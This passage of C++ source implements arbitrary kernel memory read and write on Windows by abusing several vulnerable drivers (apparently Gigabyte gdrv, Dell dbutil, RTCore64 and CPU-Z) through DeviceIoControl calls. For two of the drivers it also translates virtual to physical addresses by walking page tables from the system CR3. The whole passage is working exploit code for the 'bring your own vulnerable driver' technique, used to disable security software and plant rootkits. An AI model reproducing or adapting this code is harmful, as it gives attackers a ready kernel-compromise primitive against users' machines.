        req.dst = reinterpret_cast<uint64_t>(tmp.data());
        req.src = address;
        req.size = static_cast<uint32_t>(size);

        DWORD returned = 0;
        if (!DeviceIoControl(g_device, IOCTL_GIO_MEMCPY, &req, sizeof(req), nullptr, 0, &returned, nullptr))
            return false;

        memcpy(buffer, tmp.data(), size);
        return true;
    }

    if (g_type == VulnDriverType::Dbutil)
    {
        DbutilBuffer req{};
        req.address = address;
        req.buffer = reinterpret_cast<uint64_t>(buffer);
        req.size = static_cast<uint32_t>(size);

        DWORD returned = 0;
        return DeviceIoControl(g_device, IOCTL_DBUTIL_READ, &req, sizeof(req), nullptr, 0, &returned, nullptr) != FALSE;
    }

    if (g_type == VulnDriverType::RTCore64 || g_type == VulnDriverType::Cpuz)
    {
        uint64_t cr3 = 0;
        if (!FindSystemCr3(&cr3))
            return false;

        auto* out = static_cast<uint8_t*>(buffer);
        size_t offset = 0;
        while (offset < size)
        {
            const uint64_t virt = address + offset;
            uint64_t phys = 0;
            if (!VirtToPhys(virt, cr3, &phys))
                return false;

            const size_t pageRemain = 0x1000 - (virt & 0xFFF);
            const size_t chunk = (size - offset < pageRemain) ? (size - offset) : pageRemain;

            if (!ReadPhysical(out + offset, phys, chunk))
                return false;

            offset += chunk;
        }
        return true;
    }

    return false;
}

bool VulnWriteKernelMemory(uint64_t address, const void* buffer, size_t size, DWORD* win32ErrorOut)
{
    if (win32ErrorOut)
        *win32ErrorOut = 0;

    if (!VulnDriverIsLoaded() || !buffer || size == 0)
        return false;

    if (g_type == VulnDriverType::Gdrv)
    {
        if (size > 0xFFFFFFFFu)
            return false;

        std::vector<uint8_t> tmp(size);
        memcpy(tmp.data(), buffer, size);

        GioMemcpy req{};
        req.dst = address;
        req.src = reinterpret_cast<uint64_t>(tmp.data());
        req.size = static_cast<uint32_t>(size);

        DWORD returned = 0;
        SetLastError(0);
        const BOOL ok = DeviceIoControl(g_device, IOCTL_GIO_MEMCPY, &req, sizeof(req), nullptr, 0, &returned, nullptr);
        if (!ok && win32ErrorOut)
            *win32ErrorOut = GetLastError();
        return ok != FALSE;
    }

    if (g_type == VulnDriverType::Dbutil)
    {
        DbutilBuffer req{};
        req.address = address;
        req.buffer = reinterpret_cast<uint64_t>(const_cast<void*>(buffer));
        req.size = static_cast<uint32_t>(size);

        DWORD returned = 0;
        SetLastError(0);
        const BOOL ok = DeviceIoControl(g_device, IOCTL_DBUTIL_WRITE, &req, sizeof(req), nullptr, 0, &returned, nullptr);
        if (!ok && win32ErrorOut)
            *win32ErrorOut = GetLastError();
        return ok != FALSE;
    }

    if (g_type == VulnDriverType::RTCore64 || g_type == VulnDriverType::Cpuz)
    {
        uint64_t cr3 = 0;
        if (!FindSystemCr3(&cr3))
            return false;

        const auto* in = static_cast<const uint8_t*>(buffer);
        size_t offset = 0;
        while (offset < size)
        {
            const uint64_t virt = address + offset;
            uint64_t phys = 0;
            if (!VirtToPhys(virt, cr3, &phys))
                return false;

            const size_t pageRemain = 0x1000 - (virt & 0xFFF);
            const size_t chunk = (size - offset < pageRemain) ? (size - offset) : pageRemain;

            SetLastError(0);
            bool chunkOk = false;
            if (g_type == VulnDriverType::RTCore64)
                chunkOk = WritePhysicalRtCore(g_device, phys, in + offset, static_cast<uint32_t>(chunk));
            else
                chunkOk = WritePhysicalCpuz(g_device, phys, in + offset, static_cast<uint32_t>(chunk));

            if (!chunkOk)
            {
                if (win32ErrorOut)
                    *win32ErrorOut = GetLastError();
                return false;
            }

            offset += chunk;
        }
        return true;
    }

    return false;
}
